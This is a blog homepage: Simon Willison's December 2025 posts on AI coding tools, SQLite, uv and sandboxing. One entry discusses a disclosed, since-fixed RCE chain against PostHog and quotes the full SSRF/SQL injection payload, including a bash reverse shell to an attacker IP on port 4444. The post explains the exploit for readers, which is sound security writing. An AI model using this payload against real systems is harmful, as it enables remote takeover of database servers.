Simon Willison’s Weblog Simon Willison’s Weblog About Subscribe TILs Tools On security 571 ai-assisted-programming 297 prompt-engineering 176 careers 59 javascript 731 ... Recent Dec. 30, 2025 [...] The puzzle is still there. What’s gone is the labor. I never enjoyed hitting keys, writing minimal repro cases with little insight, digging through debug logs, or trying to decipher some obscure AWS IAM permission error. That work wasn’t the puzzle for me. It was just friction, laborious and frustrating. The thinking remains; the hitting of the keys and the frustrating is what’s been removed. — Armin Ronacher # 11:54 pm / ai-assisted-programming , generative-ai , armin-ronacher , ai , llms TIL: Downloading archived Git repositories from archive.softwareheritage.org ( via )
    Back in February I blogged about a neat Python library called sqlite-s3vfs for accessing SQLite databases hosted in an S3 bucket, released as MIT licensed open source by the UK government's Department for Business and Trade. I went looking for it today and found that the github.com/uktrade/sqlite-s3vfs repository is now a 404. Since this is taxpayer-funded open source software I saw it as my moral duty to try and restore access! It turns out a full copy had been captured by the Software Heritage archive , so I was able to restore  the repository from there. My copy is now archived at simonw/sqlite-s3vfs . The process for retrieving an archive was non-obvious, so I've written up a TIL and also published a new Software Heritage Repository Retriever tool which takes advantage of the CORS-enabled APIs provided by Software Heritage. Here's the Claude Code transcript from building that. # 11:51 pm / archives , git , github , open-source , tools , ai , til , generative-ai , llms , ai-assisted-programming , claude-code In essence a language model changes you from a programmer who writes lines of code, to a programmer that manages the context the model has access to, prunes irrelevant things, adds useful material to context, and writes detailed specifications. If that doesn't sound fun to you, you won't enjoy it. Think about it as if it is a junior developer that has read every textbook in the world but has 0 practical experience with your specific codebase, and is prone to forgetting anything but the most recent hour of things you've told it. What do you want to tell that intern to help them progress? Eg you might put sticky notes on their desk to remind them of where your style guide lives, what the API documentation is for the APIs you use, some checklists of what is done and what is left to do, etc. But the intern gets confused easily if it keeps accumulating sticky notes and there are now 100 sticky notes, so you have to periodically clear out irrelevant stickies and replace them with new stickies. — Liz Fong-Jones , thread on Bluesky # 4:05 pm / bluesky , ai-assisted-programming , generative-ai , ai , llms , context-engineering Dec. 29, 2025 shot-scraper 1.9 .
    New release of my shot-scraper CLI tool for taking screenshots and scraping websites with JavaScript from the terminal. The shot-scraper har command has a new -x/--extract option which extracts all of the resources loaded by the page out to a set of files. This location can be controlled by the -o dir/ option. #184 Fixed the shot-scraper accessibility command for compatibility with the latest Playwright. #185 The new shot-scraper har -x https://simonwillison.net/ command is really neat. The inspiration was the digital forensics expedition I went on to figure out why Rob Pike got spammed. You can now perform a version of that investigation like this: cd /tmp
shot-scraper har --wait 10000 'https://theaidigest.org/village?day=265' -x Then dig around in the resulting JSON files in the /tmp/theaidigest-org-village folder. # 10:33 pm / projects , annotated-release-notes , shot-scraper But once we got that and got this aviation grade testing in place, the number of bugs just dropped to a trickle. Now we still do have bugs but the aviation grade testing allows us to move fast, which is important because in this business you either move fast or you're disrupted. So, we're able to make major changes to the structure of the code that we deliver and be confident that we're not breaking things because we had these intense tests. Probably half the time we spend is actually writing new tests, we're constantly writing new tests. And over the 17-year history, we have amassed a huge suite of tests which we run constantly. Other database engines don't do this; don't have this
level of testing. But they're still high quality, I mean, I
noticed in particular, PostgreSQL is a very high-quality database engine, they don't have many bugs. I went to the PostgreSQL and ask them “how do you prevent the bugs”? We talked about this for a while. What I came away with was they've got a very elaborate peer review process, and if they've got code that has worked for 10 years they just don't mess with it, leave it alone, it
works. Whereas we change our code fearlessly, and we have a much smaller team and we don't have the peer review process. — D. Richard Hipp , ACM SIGMOD Record, June 2019 (PDF) # 9:51 pm / testing , d-richard-hipp , postgresql , sqlite The hard part of computer programming isn't expressing what we want the machine to do in code. The hard part is turning human thinking -- with all its wooliness and ambiguity and contradictions -- into computational thinking that is logically precise and unambiguous, and that can then be expressed formally in the syntax of a programming language. That was the hard part when programmers were punching holes in cards. It was the hard part when they were typing COBOL code. It was the hard part when they were bringing Visual Basic GUIs to life (presumably to track the killer's IP address). And it's the hard part when they're prompting language models to predict plausible-looking Python. The hard part has always been – and likely will continue to be for many years to come – knowing exactly what to ask for. — Jason Gorman , The Future of Software Development Is Software Developers # 8:50 pm / ai-ethics , careers , generative-ai , ai , llms Copyright Release for Contributions To SQLite .
    D. Richard Hipp called me out for spreading misinformation on Hacker News that SQLite refuses outside contributions: No, Simon, we don't "refuse". We are just very selective and there is a lot of paperwork involved to confirm the contribution is in the public domain and does not contaminate the SQLite core with licensed code. I deeply regret this error! I'm linking to the copyright release document here - it looks like SQLite's public domain nature makes this kind of clause extremely important: [...] To the best of my knowledge and belief, the changes and enhancements that I have contributed to SQLite are either originally written by me or are derived from prior works which I have verified are also in the public domain and are not subject to claims of copyright by other parties. Out of curiosity I decided to see how many people have contributed to SQLite outside of the core team of Richard, Dan and Joe. I ran that query using Fossil, SQLite's own SQLite-based version control system, like this: brew install fossil
fossil clone https://www.sqlite.org/src sqlite.fossil
fossil sql -R sqlite.fossil "
  SELECT user, COUNT(*) as commits
  FROM event WHERE type='ci'
  GROUP BY user ORDER BY commits DESC
" I got back 38 rows, though I think danielk1977 and dan may be duplicates. Update : The SQLite team have clarified this on their SQLite is Public Domain page. It used to read "In order to keep SQLite completely free and unencumbered by copyright, the project does not accept patches." - it now reads: In order to keep SQLite completely free and unencumbered by copyright, the project does not accept patches from random people on the internet. There is a process to get a patch accepted, but that process is involved and for smaller changes is not normally worth the effort. # 7:58 pm / open-source , sqlite , d-richard-hipp Jevons paradox is coming to knowledge work. By making it far cheaper to take on any type of task that we can possibly imagine, we’re ultimately going to be doing far more. The vast majority of AI tokens in the future will be used on things we don't even do today as workers: they will be used on the software projects that wouldn't have been started, the contracts that wouldn't have been reviewed, the medical research that wouldn't have been discovered, and the marketing campaign that wouldn't have been launched otherwise. — Aaron Levie , Jevons Paradox for Knowledge Work # 3:32 am / ai-ethics , careers , ai , llms , generative-ai , jevons-paradox Dec. 28, 2025 simonw/actions-latest .
    Today in extremely niche projects, I got fed up of Claude Code creating GitHub Actions workflows for me that used stale actions: actions/setup-python@v4 when the latest is actions/setup-python@v6 for example. I couldn't find a good single place listing those latest versions, so I had Claude Code for web (via my phone, I'm out on errands) build a Git scraper to publish those versions in one place: https://simonw.github.io/actions-latest/versions.txt Tell your coding agent of choice to fetch that any time it wants to write a new GitHub Actions workflows. (I may well bake this into a Skill.) Here's the first and second transcript I used to build this, shared using my claude-code-transcripts tool (which just gained a search feature .) # 10:45 pm / github , ai , github-actions , git-scraping , generative-ai , llms , coding-agents , claude-code I just sent out the latest edition of the newsletter version of this blog. It's a long one! Turns out I wrote a lot of stuff in the past 10 days. The newsletter is out two days later than I had planned because I kept running into an infuriating issue with Substack: it would refuse to save my content with a "Network error" and "Not saved" and I couldn't figure out why. So I asked ChatGPT to dig into it , which dug up this Hacker News post about the string /etc/hosts triggering an error. And yeah, it turns out my newsletter included this post describing a SQL injection attack against ClickHouse and PostgreSQL which included the full exploit that was used. Deleting that annotated example exploit allowed me to send the letter! # 4:16 am / sql-injection , security , newsletter , substack Dec. 27, 2025 In advocating for LLMs as useful and important technology despite how they're trained I'm beginning to feel a little bit like John Cena in Pluribus . Pluribus spoiler (episode 6) Given our druthers, would we choose to consume HDP? No. Throughout history, most cultures, though not all, have taken a dim view of anthropophagy. Honestly, we're not that keen on it ourselves. But we're left with little choice. # 3:43 pm / ai-ethics , generative-ai , tv , training-data , ai , llms A year ago, Claude struggled to generate bash commands without escaping issues. It worked for seconds or minutes at a time. We saw early signs that it may become broadly useful for coding one day. Fast forward to today. In the last thirty days, I landed 259 PRs -- 497 commits, 40k lines added, 38k lines removed. Every single line was written by Claude Code + Opus 4.5. — Boris Cherny , creator of Claude Code # 2:13 pm / anthropic , claude , ai , claude-code , llms , coding-agents , ai-assisted-programming , generative-ai textarea.my on GitHub ( via )
    Anton Medvedev built textarea.my , which he describes as: A minimalist text editor that lives entirely in your browser and stores everything in the URL hash. It's ~160 lines of HTML, CSS and JavaScript and it's worth reading the whole thing. I picked up a bunch of neat tricks from this! <article contenteditable="plaintext-only"> - I did not know about the plaintext-only value, supported across all the modern browsers . It uses new CompressionStream('deflate-raw') to compress the editor state so it can fit in a shorter fragment URL. It has a neat custom save option which triggers if you hit ((e.metaKey || e.ctrlKey) && e.key === 's') - on browsers that support it (mainly Chrome variants) this uses window.showSaveFilePicker() , other browsers get a straight download - in both cases generated using URL.createObjectURL(new Blob([html], {type: 'text/html'})) The debounce() function it uses deserves a special note: function debounce ( ms , fn ) { let timer return ( ... args ) => { clearTimeout ( timer ) timer = setTimeout ( ( ) => fn ( ... args ) , ms ) } } That's really elegant. The goal of debounce(ms, fn) is to take a function and a timeout (e.g. 100ms) and ensure that the function runs at most once every 100ms. This one works using a closure variable timer to capture the setTimeout time ID. On subsequent calls that timer is cancelled and a new one is created - so if you call the function five times in quick succession it will execute just once, 100ms after the last of that sequence of calls. # 3:23 am / javascript Dec. 26, 2025 How uv got so fast .
    Andrew Nesbitt provides an insightful teardown of why uv is so much faster than pip . It's not nearly as simple as just "they rewrote it in Rust" - uv gets to skip a huge amount of Python packaging history (which pip needs to implement for backwards compatibility) and benefits enormously from work over recent years that makes it possible to resolve dependencies across most packages without having to execute the code in setup.py using a Python interpreter. Two notes that caught my eye that I hadn't understood before: HTTP range requests for metadata. Wheel files are zip archives, and zip archives put their file listing at the end. uv tries PEP 658 metadata first, falls back to HTTP range requests for the zip central directory, then full wheel download, then building from source. Each step is slower and riskier. The design makes the fast path cover 99% of cases. None of this requires Rust. [...] Compact version representation . uv packs versions into u64 integers where possible, making comparison and hashing fast. Over 90% of versions fit in one u64. This is micro-optimization that compounds across millions of comparisons. I wanted to learn more about these tricks, so I fired up an asynchronous research task and told it to checkout the astral-sh/uv repo, find the Rust code for both of those features and try porting it to Python to help me understand how it works. Here's the report that it wrote for me , the prompts I used and the Claude Code transcript . You can try the script it wrote for extracting metadata from a wheel using HTTP range requests like this: uv run --with httpx https://raw.githubusercontent.com/simonw/research/refs/heads/main/http-range-wheel-metadata/wheel_metadata.py https://files.pythonhosted.org/packages/8b/04/ef95b67e1ff59c080b2effd1a9a96984d6953f667c91dfe9d77c838fc956/playwright-1.57.0-py3-none-macosx_11_0_arm64.whl -v The Playwright wheel there is ~40MB. Adding -v at the end causes the script to spit out verbose details of how it fetched the data - which looks like this . Key extract from that output: [1] HEAD request to get file size...
    File size: 40,775,575 bytes
[2] Fetching last 16,384 bytes (EOCD + central directory)...
    Received 16,384 bytes
[3] Parsed EOCD:
    Central directory offset: 40,731,572
    Central directory size: 43,981
    Total entries: 453
[4] Fetching complete central directory...
    ...
[6] Found METADATA: playwright-1.57.0.dist-info/METADATA
    Offset: 40,706,744
    Compressed size: 1,286
    Compression method: 8
[7] Fetching METADATA content (2,376 bytes)...
[8] Decompressed METADATA: 3,453 bytes

Total bytes fetched: 18,760 / 40,775,575 (100.0% savings) The section of the report on compact version representation is interesting too. Here's how it illustrates sorting version numbers correctly based on their custom u64 representation: Sorted order (by integer comparison of packed u64):
  1.0.0a1 (repr=0x0001000000200001)
  1.0.0b1 (repr=0x0001000000300001)
  1.0.0rc1 (repr=0x0001000000400001)
  1.0.0 (repr=0x0001000000500000)
  1.0.0.post1 (repr=0x0001000000700001)
  1.0.1 (repr=0x0001000100500000)
  2.0.0.dev1 (repr=0x0002000000100001)
  2.0.0 (repr=0x0002000000500000) # 11:43 pm / performance , python , rust , uv How Rob Pike got spammed with an AI slop “act of kindness” Rob Pike ( that Rob Pike ) is furious . Here’s a Bluesky link for if you have an account there and a link to it in my thread viewer if you don’t. [... 2,158 words ] 6:16 pm / rob-pike , ai , shot-scraper , generative-ai , llms , slop , ai-agents , ai-ethics Dec. 25, 2025 A new way to extract detailed transcripts from Claude Code I’ve released claude-code-transcripts , a new Python CLI tool for converting Claude Code transcripts to detailed HTML pages that provide a better interface for understanding what Claude Code has done than even Claude Code itself. The resulting transcripts are also designed to be shared, using any static HTML hosting or even via GitHub Gists. [... 1,082 words ] 11:52 pm / projects , ai , generative-ai , llms , ai-assisted-programming , anthropic , claude , coding-agents , claude-code Dec. 24, 2025 uv-init-demos . uv has a useful uv init command for setting up new Python projects, but it comes with a bunch of different options like --app and --package and --lib and I wasn't sure how they differed. So I created this GitHub repository which demonstrates all of those options, generated using this update-projects.sh script ( thanks, Claude ) which will run on a schedule via GitHub Actions to capture any changes made by future releases of uv . # 10:05 pm / projects , python , github-actions , git-scraping , uv Dec. 23, 2025 If this [MicroQuickJS] had been available in 2010, Redis scripting would have been JavaScript and not Lua. Lua was chosen based on the implementation requirements, not on the language ones... (small, fast, ANSI-C). I appreciate certain ideas in Lua, and people love it, but I was never able to like Lua, because it departs from a more Algol-like syntax and semantics without good reasons, for my taste. This creates friction for newcomers. I love friction when it opens new useful ideas and abstractions that are worth it, if you learn SmallTalk or FORTH and for some time you are lost, it's part of how the languages are different. But I think for Lua this is not true enough: it feels like it departs from what people know without good reasons. — Salvatore Sanfilippo , Hacker News comment on MicroQuickJS # 11:03 pm / salvatore-sanfilippo , lua , redis , javascript MicroQuickJS .
    New project from programming legend Fabrice Bellard, of ffmpeg and QEMU and QuickJS and so much more fame: MicroQuickJS (aka. MQuickJS) is a Javascript engine targetted at embedded systems. It compiles and runs Javascript programs with as low as 10 kB of RAM. The whole engine requires about 100 kB of ROM (ARM Thumb-2 code) including the C library. The speed is comparable to QuickJS. It supports a subset of full JavaScript , though it looks like a rich and full-featured subset to me. One of my ongoing interests is sandboxing: mechanisms for executing untrusted code - from end users or generated by LLMs - in an environment that restricts memory usage and applies a strict time limit and restricts file or network access. Could MicroQuickJS be useful in that context? I fired up Claude Code for web (on my iPhone) and kicked off an asynchronous research project to see explore that question: My full prompt is here . It started like this: Clone https://github.com/bellard/mquickjs to /tmp Investigate this code as the basis for a safe sandboxing environment for running untrusted code such that it cannot exhaust memory or CPU or access files or the network First try building python bindings for this using FFI - write a script that builds these by checking out the code to /tmp and building against that, to avoid copying the C code in this repo permanently. Write and execute tests with pytest to exercise it as a sandbox Then build a "real" Python extension not using FFI and experiment with that Then try compiling the C to WebAssembly and exercising it via both node.js and Deno, with a similar suite of tests [...] I later added to the interactive session: Does it have a regex engine that might allow a resource exhaustion attack from an expensive regex? (The answer was no - the regex engine calls the interrupt handler even during pathological expression backtracking, meaning that any configured time limit should still hold.) Here's the full transcript and the final report . Some key observations: MicroQuickJS is very well suited to the sandbox problem. It has robust near and time limits baked in, it doesn't expose any dangerous primitive like filesystem of network access and even has a regular expression engine that protects against exhaustion attacks (provided you configure a time limit). Claude span up and tested a Python library that calls a MicroQuickJS shared library (involving a little bit of extra C), a compiled a Python binding and a library that uses the original MicroQuickJS CLI tool. All of those approaches work well. Compiling to WebAssembly was a little harder. It got a version working in Node.js and Deno and Pyodide, but the Python libraries wasmer and wasmtime proved harder, apparently because "mquickjs uses setjmp/longjmp for error handling". It managed to get to a working wasmtime version with a gross hack . I'm really excited about this. MicroQuickJS is tiny, full featured, looks robust and comes from excellent pedigree. I think this makes for a very solid new entrant in the quest for a robust sandbox. Update : I had Claude Code build tools.simonwillison.net/microquickjs , an interactive web playground for trying out the WebAssembly build of MicroQuickJS, adapted from my previous QuickJS plaground . My QuickJS page loads 2.28 MB (675 KB transferred). The MicroQuickJS one loads 303 KB (120 KB transferred). Here are the prompts I used for that. # 8:53 pm / c , javascript , nodejs , python , sandboxing , ai , webassembly , deno , pyodide , generative-ai , llms , claude-code , fabrice-bellard Cooking with Claude I’ve been having an absurd amount of fun recently using LLMs for cooking. I started out using them for basic recipes, but as I’ve grown more confident in their culinary abilities I’ve leaned into them for more advanced tasks. Today I tried something new: having Claude vibe-code up a custom application to help with the timing for a complicated meal preparation. It worked really well! [... 1,313 words ] 5:01 am / cooking , devfort , tools , ai , generative-ai , llms , anthropic , claude , vision-llms , vibe-coding Dec. 22, 2025 I just had my first success using a browser agent - in this case the Claude in Chrome extension - to solve an actual problem. A while ago I set things up so anything served from the https://static.simonwillison.net/static/cors-allow/ directory of my S3 bucket would have open Access-Control-Allow-Origin: * headers. This is useful for hosting files online that can be loaded into web applications hosted on other domains. Problem is I couldn't remember how I did it! I initially thought it was an S3 setting, but it turns out S3 lets you set CORS at the bucket-level but not for individual prefixes. I then suspected Cloudflare, but I find the Cloudflare dashboard really difficult to navigate. So I decided to give Claude in Chrome a go. I installed and enabled the extension (you then have to click the little puzzle icon and click "pin" next to Claude for the icon to appear, I had to ask Claude itself for help figuring that out), signed into Cloudflare, opened the Claude panel and prompted: I'm trying to figure out how come all pages under http://static.simonwillison.net/static/cors/ have an open CORS policy, I think I set that up through Cloudflare but I can't figure out where Off it went. It took 1m45s to find exactly what I needed. Claude's conclusion: Found it! Your open CORS policy for the /static/cors/ directory on static.simonwillison.net is configured through Cloudflare Transform Rules , specifically a Response Header Transform Rule named static.simonwillis.net/static/cors-allow/* There's no "share transcript" option but I used copy and paste and two gnarly Claude Code sessions ( one , two ) to turn it into an HTML transcript which you can take a look at here . I remain deeply skeptical of the entire browsing agent category due to my concerns about prompt injection risks—I watched what it was doing here like a hawk —but I have to admit this was a very positive experience. # 4:10 pm / anthropic , claude , browser-agents , cors , ai , llms , generative-ai , chrome , cloudflare , prompt-injection , ai-agents Dec. 21, 2025 Every time you are inclined to use the word “teach”, replace it with “learn”. That is, instead of saying, “I teach”, say “They learn”. It’s very easy to determine what you teach; you can just fill slides with text and claim to have taught. Shift your focus to determining how you know whether they learned what you claim to have taught (or indeed anything at all!). That is much harder, but that is also the real objective of any educator. — Shriram Krishnamurthi , Pedagogy Recommendations # 5:26 am / teaching Dec. 19, 2025 In 2025, Reinforcement Learning from Verifiable Rewards (RLVR) emerged as the de facto new major stage to add to this mix. By training LLMs against automatically verifiable rewards across a number of environments (e.g. think math/code puzzles), the LLMs spontaneously develop strategies that look like "reasoning" to humans - they learn to break down problem solving into intermediate calculations and they learn a number of problem solving strategies for going back and forth to figure things out (see DeepSeek R1 paper for examples). — Andrej Karpathy , 2025 LLM Year in Review # 11:07 pm / andrej-karpathy , llm , generative-ai , llm-reasoning , definitions , ai , llms , deepseek Sam Rose explains how LLMs work with a visual essay .
    Sam Rose is one of my favorite authors of explorable interactive explanations - here's his previous collection . Sam joined ngrok in September as a developer educator. Here's his first big visual explainer for them, ostensibly about how prompt caching works but it quickly expands to cover tokenization, embeddings, and the basics of the transformer architecture. The result is one of the clearest and most accessible introductions to LLM internals I've seen anywhere. # 6:33 pm / ai , explorables , generative-ai , llms , sam-rose , tokenization Introducing GPT-5.2-Codex .
    The latest in OpenAI's Codex family of models (not the same thing as their Codex CLI or Codex Cloud coding agent tools). GPT‑5.2-Codex is a version of GPT‑5.2⁠ further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities. As with some previous Codex models this one is available via their Codex coding agents now and will be coming to the API "in the coming weeks". Unlike previous models there's a new invite-only preview process for vetted cybersecurity professionals for "more permissive models". I've been very impressed recently with GPT 5.2's ability to tackle multi-hour agentic coding challenges . 5.2 Codex scores 64% on the Terminal-Bench 2.0 benchmark that GPT-5.2 scored 62.2% on. I'm not sure how concrete that 1.8% improvement will be! I didn't hack API access together this time (see previous attempts ), instead opting to just ask Codex CLI to "Generate an SVG of a pelican riding a bicycle" while running the new model (effort medium). Here's the transcript in my new Codex CLI timeline viewer, and here's the pelican it drew: # 5:21 am / ai , openai , generative-ai , llms , pelican-riding-a-bicycle , llm-release , codex-cli , gpt-codex Agent Skills .
    Anthropic have turned their skills mechanism into an "open standard", which I guess means it lives in an independent agentskills/agentskills GitHub repository now? I wouldn't be surprised to see this end up in the AAIF , recently the new home of the MCP specification. The specification itself lives at agentskills.io/specification , published from docs/specification.mdx in the repo. It is a deliciously tiny specification - you can read the entire thing in just a few minutes. It's also quite heavily under-specified - for example, there's a metadata field described like this: Clients can use this to store additional properties not defined by the Agent Skills spec We recommend making your key names reasonably unique to avoid accidental conflicts And an allowed-skills field: Experimental. Support for this field may vary between agent implementations Example: allowed-tools: Bash(git:*) Bash(jq:*) Read The Agent Skills homepage promotes adoption by OpenCode, Cursor,Amp, Letta, goose, GitHub, and VS Code. Notably absent is OpenAI, who are quietly tinkering with skills but don't appear to have formally announced their support just yet. Update 20th December 2025 : OpenAI have added Skills to the Codex documentation and the Codex logo is now featured on the Agent Skills homepage (as of this commit .) # 1:09 am / ai , generative-ai , llms , anthropic , ai-agents , coding-agents , skills Dec. 18, 2025 swift-justhtml .
    First there was Emil Stenström's JustHTML in Python , then my justjshtml in JavaScript , then Anil Madhavapeddy's html5rw in OCaml , and now Kyle Howells has built a vibespiled dependency-free HTML5 parser for Swift using the same coding agent tricks against the html5lib-tests test suite. Kyle ran some benchmarks to compare the different implementations: Rust (html5ever) total parse time: 303 ms Swift total parse time: 1313 ms JavaScript total parse time: 1035 ms Python total parse time: 4189 ms # 11:57 pm / html5 , ai , generative-ai , llms , ai-assisted-programming , vibe-coding , swift Your job is to deliver code you have proven to work In all of the debates about the value of AI-assistance in software development there’s one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers—or open source maintainers—and expects the “code review” process to handle the rest. [... 840 words ] 2:49 pm / programming , careers , ai , generative-ai , llms , ai-assisted-programming , ai-ethics , vibe-coding , coding-agents Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain ( via )
    Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server. The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource. Here's the URL that gets injected: http://clickhouse:8123/?query=SELECT+ +FROM+postgresql('db:5432','posthog',\"posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\"bash+-i+>%26+/dev/tcp/172.31.221.180/4444+0>%261\\"$$;SELECT+ +FROM+cmd_exec;+--\",'posthog','posthog')# Reformatted a little for readability: http://clickhouse:8123/?query=
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    "posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \"bash -i >& /dev/tcp/172.31.221.180/4444 0>&1\"
    $$;
    SELECT * FROM cmd_exec;
    --",
    'posthog',
    'posthog'
)
# This abuses ClickHouse's ability to run its own queries against PostgreSQL using the postgresql() table function, combined with an escaping bug in ClickHouse PostgreSQL function ( since fixed ). Then that query abuses PostgreSQL's ability to run shell commands via COPY ... FROM PROGRAM . The bash -c bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands. # 1:42 am / postgresql , security , sql , sql-injection , webhooks , clickhouse Dec. 17, 2025 AoAH Day 15: Porting a complete HTML5 parser and browser test suite ( via )
    Anil Madhavapeddy is running an Advent of Agentic Humps this year, building a new useful OCaml library every day for most of December. Inspired by Emil Stenström's JustHTML and my own coding agent port of that to JavaScript he coined the term vibespiling for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in html5rw which passes the same html5lib-tests suite that Emil and myself used for our projects. Anil's thoughts on the copyright and ethical aspects of this are worth quoting in full: The question of copyright and licensing is difficult. I definitely did some editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the LICENSE a joint one with Emil Stenström . I did not follow the transitive dependency through to the Rust one, which I probably should. I'm also extremely uncertain about every releasing this library to the central opam repository, especially as there are excellent HTML5 parsers already available. I haven't checked if those pass the HTML5 test suite, because this is wandering into the agents vs humans territory that I ruled out in my groundrules . Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code! I decided to credit Emil in the same way for my own vibespiled project. # 11:23 pm / definitions , functional-programming , ai , generative-ai , llms , ai-assisted-programming , ai-ethics , vibe-coding , ocaml Highlights How Rob Pike got spammed with an AI slop "act of kindness" - Dec. 26, 2025 A new way to extract detailed transcripts from Claude Code - Dec. 25, 2025 Cooking with Claude - Dec. 23, 2025 Your job is to deliver code you have proven to work - Dec. 18, 2025 Gemini 3 Flash - Dec. 17, 2025 I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours - Dec. 15, 2025 JustHTML is a fascinating example of vibe engineering in action - Dec. 14, 2025 OpenAI are quietly adopting skills, now available in ChatGPT and Codex CLI - Dec. 12, 2025 GPT-5.2 - Dec. 11, 2025 Useful patterns for building HTML tools - Dec. 10, 2025 Under the hood of Canada Spends with Brendan Samek - Dec. 9, 2025 Highlights from my appearance on the Data Renegades podcast with CL Kao and Dori Wilson - Nov. 26, 2025 Claude Opus 4.5, and why evaluating new LLMs is increasingly difficult - Nov. 24, 2025 sqlite-utils 4.0a1 has several (minor) backwards incompatible changes - Nov. 24, 2025 Olmo 3 is a fully open LLM - Nov. 22, 2025 Nano Banana Pro aka gemini-3-pro-image-preview is the best available image generation model - Nov. 20, 2025 How I automate my Substack newsletter with content from my blog - Nov. 19, 2025 Trying out Gemini 3 Pro with audio transcription and a new pelican benchmark - Nov. 18, 2025 What happens if AI labs train for pelicans riding bicycles? - Nov. 13, 2025 Reverse engineering Codex CLI to get GPT-5-Codex-Mini to draw me a pelican - Nov. 9, 2025 Video + notes on upgrading a Datasette plugin for the latest 1.0 alpha, with help from uv and OpenAI Codex CLI - Nov. 6, 2025 Code research projects with async coding agents like Claude Code and Codex - Nov. 6, 2025 A new SQL-powered permissions system in Datasette 1.0a20 - Nov. 4, 2025 New prompt injection papers: Agents Rule of Two and The Attacker Moves Second - Nov. 2, 2025 Hacking the WiFi-enabled color screen GitHub Universe conference badge - Oct. 28, 2025 Video: Building a tool to copy-paste share terminal sessions using Claude Code for web - Oct. 23, 2025 Dane Stuckey (OpenAI CISO) on prompt injection risks for ChatGPT Atlas - Oct. 22, 2025 Living dangerously with Claude - Oct. 22, 2025 Claude Code for web - a new asynchronous coding agent from Anthropic - Oct. 20, 2025 Getting DeepSeek-OCR working on an NVIDIA Spark via brute force using Claude Code - Oct. 20, 2025 Claude Skills are awesome, maybe a bigger deal than MCP - Oct. 16, 2025 NVIDIA DGX Spark: great hardware, early days for the ecosystem - Oct. 14, 2025 Claude can write complete Datasette plugins now - Oct. 8, 2025 Vibe engineering - Oct. 7, 2025 OpenAI DevDay 2025 live blog - Oct. 6, 2025 Embracing the parallel coding agent lifestyle - Oct. 5, 2025 Designing agentic loops - Sept. 30, 2025 Claude Sonnet 4.5 is probably the "best coding model in the world" (at least for now) - Sept. 29, 2025 I think "agent" may finally have a widely enough agreed upon definition to be useful jargon now - Sept. 18, 2025 My review of Claude's new Code Interpreter, released under a very confusing name - Sept. 9, 2025 Monthly briefing Sponsor me for $10/month and get a curated email digest of the month's most important LLM developments. Pay me to send you less! Sponsor & subscribe Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025